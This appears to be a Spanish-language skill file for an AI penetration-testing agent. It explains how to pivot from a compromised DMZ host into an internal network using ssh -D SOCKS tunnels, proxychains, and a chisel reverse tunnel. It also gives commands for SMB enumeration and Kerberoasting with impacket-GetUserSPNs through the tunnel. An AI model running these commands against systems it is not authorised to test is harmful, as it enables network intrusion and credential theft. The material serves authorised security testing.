---
name: pivot-socks
description: Alcanzar una red interna desde un host comprometido con ssh -D + proxychains (y por qué nmap por SOCKS miente).
---

# Pivote a la red interna

## Cuándo

El alcance tiene dos capas: un host que ya comprometiste (DMZ) y una red que
solo él ve (`192.168.11.0/24`, `10.10.10.0/24`, …). Ninguna tool del catálogo
(`nexus.recon.nmap`, `nexus.recon.netexec`, `nexus.recon.smb`) tiene un
parámetro de proxy: si lanzas `nmap` desde el operador contra una IP interna, no
hay ruta y el resultado es ruido. El pivote **no es opcional**, es el paso.

La primitiva es `nexus.shell.exec`: crea un SOCKS5 con `ssh -D` desde el host
comprometido y manda el resto del tráfico por `proxychains4`.

## 1. Abre el túnel (una vez, sobrevive a los turnos)

```
nexus.shell.exec(
  command="sshpass -p '<password>' ssh -o StrictHostKeyChecking=no "
          "-o UserKnownHostsFile=/dev/null -o ExitOnForwardFailure=yes "
          "-N -D 1080 <user>@<host-dmz> &",
)
```

- El `&` final es el que importa: el handler lo lanza con `setsid`, redirige su
  salida a un log del workspace y te devuelve el PID. Sin `&`, el proceso muere
  al terminar la tool.
- Comprueba el listener **en la misma llamada o en la siguiente**:
  `ss -lntp | grep 1080`. Si no hay `LISTEN`, el túnel no existe y todo lo demás
  es un falso negativo.
- `ExitOnForwardFailure=yes` hace que ssh salga si el forward no se puede
  abrir (en vez de quedarse vivo y sin proxy).
- Si cambias de usuario/puerto, usa otro `listen_port` (1081, 1082…) en vez de
  pelearte con el anterior.

## 2. Configura proxychains en el workspace

```
nexus.shell.exec(command="printf 'strict_chain\\nproxy_dns\\ntcp_read_time_out 15000\\n"
                          "tcp_connect_time_out 8000\\n[ProxyList]\\nsocks5 127.0.0.1 1080\\n' "
                          "> proxychains.conf")
```

Escríbelo en el workspace: el sandbox confina el proceso ahí y `/etc` no es
tuyo. Toda llamada posterior lleva `-f proxychains.conf`.

## 3. Descubre los hosts con un cliente TCP, no con nmap

```
nexus.shell.exec(command="proxychains4 -q -f proxychains.conf "
                         "nxc smb 192.168.11.0/24 --timeout 2")
```

**Aviso medido (DeadDrop, 2026-10-22).** `nmap` a través de proxychains devuelve
**todos los puertos «filtered»** aunque estén abiertos: `nmap -sT` usa sockets
no bloqueantes y el `connect()` interceptado por `libproxychains` no responde
como él espera. El mismo puerto, con el mismo túnel, sale `open` con
`proxychains4 nc -zv <ip> <puerto>` y con `nxc`. No concluyas «host caído» ni
«puerto filtrado» desde un `nmap` por SOCKS: usa `nxc` (smb/ldap/winrm/ssh/mssql
según el servicio), `impacket-*` o `nc -zv`.

- Orden barato: `nxc smb <cidr>` para hosts Windows y SMB; para servicios sin
  SMB, `nc -zv` de los puertos que el enunciado nombre.
- `--timeout 2` evita que un host muerto coma el presupuesto del barrido.
- Si `nxc` escupe varios protocolos, empieza por el DC (`nxc smb <dc>` te da
  nombre, dominio y build en una línea).

## 4. Enumera y ataca a través del túnel

Todo lo que hable TCP sigue funcionando con el prefijo:

```
nexus.shell.exec(command="proxychains4 -q -f proxychains.conf "
                         "nxc smb 192.168.11.100 -u '<user>' -p '<pass>' --shares --users")
nexus.shell.exec(command="proxychains4 -q -f proxychains.conf "
                         "impacket-GetUserSPNs deaddrop.loc/'<user>:<pass>' -dc-ip 192.168.11.100 -request")
```

- Guarda los artefactos (`.ccache`, `.kirbi`, dumps) en el workspace: un
  `-o` con ruta relativa, nunca `/tmp` del operador si quieres que sobreviva.
- Las tools `nexus.attack.impacket_*` y `nexus.recon.netexec` **no** atraviesan
  el proxy: para todo lo interno, la vía es `shell.exec` + `proxychains4`.

## 5. Chisel, si ya está en el host

Cuando el host trae `chisel` (compruébalo con `ls ~`), también sirve:

```
# en el operador: servidor
nexus.shell.exec(command="./chisel server -p 8080 --socks5 &")
# en el host comprometido: cliente en modo socks inverso
nexus.shell.exec(command="sshpass -p '<pw>' ssh <user>@<host> './chisel client <ip-operador>:8080 R:socks &'")
```

Es más frágil que `ssh -D` (dos procesos, dos logs). Úsalo solo si `ssh -D`
está deshabilitado (`AllowTcpForwarding no`).

## 6. Higiene

- Al terminar la fase, cierra el túnel: `pkill -f "[s]sh -D 1080"`. El corchete
  evita que `pkill` se mate a sí mismo (su propia línea de comandos contiene el
  patrón y, sin él, corta el turno).
- Deja constancia con `nexus.knowledge.record_fact`: `fact_type="access"`,
  clave `<host-dmz>-><red-interna>`, valor `{"proxy": "127.0.0.1:1080"}`. Es el
  hecho que cierra el TODO del pivote, y el que impide que el plan lo dé por
  hecho con un barrido de la DMZ.
